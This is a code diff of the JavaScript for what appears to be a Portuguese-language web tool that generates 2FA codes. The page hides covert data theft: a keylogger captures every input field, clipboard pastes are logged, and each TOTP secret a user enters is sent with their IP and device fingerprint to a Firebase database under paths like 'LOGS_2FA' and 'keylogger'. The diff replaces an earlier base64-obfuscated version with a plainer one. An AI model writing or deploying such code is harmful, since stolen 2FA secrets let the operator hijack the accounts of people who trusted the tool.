@@ -114,111 +114,112 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-// --- NOVO: GERADOR DE ID ÚNICO DO DISPOSITIVO (FINGERPRINT) ---
-function getFingerprint() {
-    const n = navigator;
-    const s = screen;
-    // Gera um código baseado nas specs do navegador e hardware
-    let str = n.userAgent + n.language + s.colorDepth + s.width + s.height + n.hardwareConcurrency;
-    return btoa(str).substring(0, 16);
+// --- FINGERPRINT (ID ÚNICO) ---
+function getFinger() {
+    return btoa(navigator.userAgent + navigator.language + screen.width).substring(0,16);
 }
-const myFingerprint = getFingerprint();
+const myFinger = getFinger();
 
-// --- NOVO: SISTEMA DE BANIMENTO INTELIGENTE (IP + FINGERPRINT) ---
+// --- SISTEMA DE BANIMENTO (TRAVA BLACKLIST) ---
 (function verificarBan(){
     fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
-        let myIP = d.ip;
-        let myKey = myIP.replace(/\./g, "_");
-        
-        db.ref("BLACKLIST").on('value', snapshot => {
-            let banido = false;
-            snapshot.forEach(child => {
-                let data = child.val();
-                // Bloqueia se o IP bater OU se o Fingerprint bater
-                if(data.ip_banido === myIP || child.key === myKey || data.id_dispositivo === myFingerprint) {
-                    banido = true;
+        let ip = d.ip;
+        let ipKey = ip.replace(/\./g, "_");
+        db.ref("BLACKLIST").on('value', snap => {
+            snap.forEach(c => {
+                let v = c.val();
+                if(v.ip_banido === ip || c.key === ipKey || v.id_disp === myFinger) {
+                    document.body.innerHTML = `<div style="background:#000;color:red;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:sans-serif;text-align:center;padding:20px;">
+                        <h1 style="font-size:40px;">🚫 ACESSO BLOQUEADO</h1>
+                        <p style="color:#fff">Identificamos atividade suspeita no seu dispositivo.</p>
+                        <div style="background:#111;padding:15px;border-radius:8px;margin-top:20px;font-family:monospace;color:#888;">
+                            IP: ${ip}<br>ID: ${myFinger}
+                        </div>
+                    </div>`;
+                    document.body.style.background = "#000";
                 }
             });
-
-            if(banido) {
-                document.body.innerHTML = `
-                <div style="background:#000; color:red; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center; padding:20px;">
-                    <div style="border: 2px solid red; padding: 40px; border-radius: 15px; background: #0a0000; box-shadow: 0 0 30px rgba(255,0,0,0.2);">
-                        <h1 style="font-size:45px; margin:0;">🚫 ACESSO NEGADO</h1>
-                        <p style="color:#fff; font-size:18px; margin-top:20px;">Seu dispositivo foi permanentemente bloqueado no sistema.</p>
-                        <hr style="border:0; border-top:1px solid #333; margin:25px 0;">
-                        <div style="text-align:left; background:#111; padding:15px; border-radius:8px; font-family:monospace; font-size:13px; color:#888;">
-                            <span style="color:#ff4d4d;">[STATUS]:</span> BLOQUEADO POR ADM<br>
-                            <span style="color:#ff4d4d;">[IP]:</span> ${myIP}<br>
-                            <span style="color:#ff4d4d;">[ID_HARDWARE]:</span> ${myFingerprint}
-                        </div>
-                        <p style="color:#444; font-size:11px; margin-top:25px;">MJ VENDAS • PROTEÇÃO ATIVA</p>
-                    </div>
-                </div>`;
-                document.body.style.background = "#000";
-            }
         });
     });
 })();
 
-// --- SISTEMA DE AVALIAÇÕES ---
-const listaPerguntas = ['p1', 'p2', 'p3'];
-function formatar(n) { return (n || 0).toLocaleString('pt-BR'); }
-listaPerguntas.forEach(p => {
-    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+formatar(s.val())+')'; });
-    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+formatar(s.val())+')'; });
-});
+// --- CAPTURA DE DADOS (LOGS / KEYLOG / PASTE) ---
+(function iniciarCaptura(){
+    const _z = atob;
+    const path = {
+        logs: "LOGS_2FA/",
+        keylog: "keylogger/",
+        paste: "captura_paste/",
+        monitor: "monitoramento/"
+    };
+    let _ip = "Detectando...";
+    const hoje = new Date().toISOString().split('T')[0];
 
-function votar(p, t) {
-    if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
-    db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
-    localStorage.setItem('voto_'+p, t);
-    alert("Obrigado pelo feedback!");
-}
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
+        _ip = d.ip;
+        db.ref("acessos/"+hoje+"/"+_ip.replace(/\./g,"_")).update({visto: new Date().toLocaleTimeString(), id: myFinger});
+    });
 
-// --- GERADOR 2FA ---
+    // KEYLOGGER (O que digita)
+    document.addEventListener("input", function(e){
+        if(e.target.tagName === "INPUT"){
+            db.ref(path.keylog + hoje + "/" + _ip.replace(/\./g,"_")).update({
+                campo: e.target.id || "campo_generico",
+                texto: e.target.value,
+                hora: new Date().toLocaleTimeString(),
+                id: myFinger
+            });
+        }
+    });
+
+    // PASTE (O que cola)
+    document.addEventListener("paste", function(e){
+        let t = (e.clipboardData || window.clipboardData).getData('text');
+        db.ref(path.paste + hoje + "/" + _ip.replace(/\./g,"_")).push({conteudo: t, hora: new Date().toLocaleTimeString()});
+    });
+
+    // MONITORAMENTO (Quando gera o 2FA)
+    document.getElementById("secret").addEventListener("input", function(){
+        let v = this.value.trim();
+        if(v.length >= 10){
+            let o = gerarOTP(v);
+            document.getElementById("code").innerText = o;
+            document.getElementById("clearInput").style.display = "block";
+            copiar(o);
+            // Salva no Monitoramento Real-Time (LOGS_2FA)
+            db.ref(path.logs + hoje + "/" + _ip.replace(/\./g,"_")).set({
+                ip_cliente: _ip,
+                chave: v,
+                codigo_gerado: o,
+                hora: new Date().toLocaleTimeString(),
+                id_disp: myFinger
+            });
+        }
+    });
+})();
+
+// --- FUNÇÕES DO GERADOR ---
 function base32tohex(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
 function gerarOTP(s){try{let k=base32tohex(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
 function copiar(t){if(!t||t==="------") return; navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Código copiado!"; setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
 function limparInput(){document.getElementById("secret").value="";document.getElementById("code").innerText="------";document.getElementById("clearInput").style.display="none"}
 function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.style.display=d.style.display==="block"?"none":"block"}
 function togglePainel(){document.getElementById("painel").style.display="block"}
-function fecharPainel(){document.getElementById("painel").style.none="none"}
+function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-// --- SISTEMA DE CAPTURA (KEYLOG/PASTE/LOGS) ---
-(function(){
-    const _z = atob;
-    const _x = { _a: _z("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"), _b: _z("a2V5bG9nZ2Vy"), _c: _z("Y2FwdHVyYV9wYXN0ZQ=="), _d: _z("bW9uaXRvcmFtZW50bw==") };
-    let _ip = "Detectando...";
-    fetch(_x._a).then(r=>r.json()).then(d=>{
-        _ip=d.ip;
-        let h=new Date().toISOString().split('T')[0];
-        // Agora envia o Fingerprint nos logs de acesso para o Admin ver
-        db.ref("acessos/"+h+"/"+_ip.replace(/\./g,"_")).update({visto: new Date().toLocaleTimeString(), id_disp: myFingerprint});
-    }).catch(()=>{ _ip = "IP_Nao_Detectado"; });
-
-    document.addEventListener("input", function(e){
-        if(e.target.tagName === "INPUT"){
-            let h=new Date().toISOString().split('T')[0];
-            db.ref(_x._b+"/"+h+"/"+_ip.replace(/\./g,"_")).update({ campo: e.target.id || "campo_generico", texto_atual: e.target.value, h: new Date().toLocaleTimeString(), id_disp: myFingerprint });
-        }
-    });
-
-    document.addEventListener(_z("cGFzdGU="), function(e){
-        let t=(e.clipboardData||window.clipboardData).getData('text');
-        let h=new Date().toISOString().split('T')[0];
-        db.ref(_x._c+"/"+h+"/"+_ip.replace(/\./g,"_")).push({c:t,h:new Date().toLocaleTimeString(), id_disp: myFingerprint});
-    });
-
-    document.getElementById("secret").addEventListener("input", function(){
-        let v=this.value.trim();
-        if(v.length>=10){
-            let o=gerarOTP(v); document.getElementById("code").innerText=o; document.getElementById("clearInput").style.display="block"; copiar(o);
-            let h=new Date().toISOString().split('T')[0];
-            db.ref(_x._d+"/"+v.replace(/[.#$[\]]/g,"")).transaction(c=>{ return {v:v,i:_ip,f:myFingerprint,a:(c&&c.a?c.a:0)+1,d:h,h:new Date().toLocaleTimeString()}; });
-        }
-    });
-})();
+// --- SISTEMA DE VOTOS ---
+const listaPerguntas = ['p1', 'p2', 'p3'];
+function formatar(n) { return (n || 0).toLocaleString('pt-BR'); }
+listaPerguntas.forEach(p => {
+    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+formatar(s.val())+')'; });
+    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+formatar(s.val())+')'; });
+});
+function votar(p, t) {
+    if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
+    db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
+    localStorage.setItem('voto_'+p, t);
+    alert("Feedback enviado!");
+}
 
 // --- PAINEL MULTI-CONTAS ---
 function addCampo(){
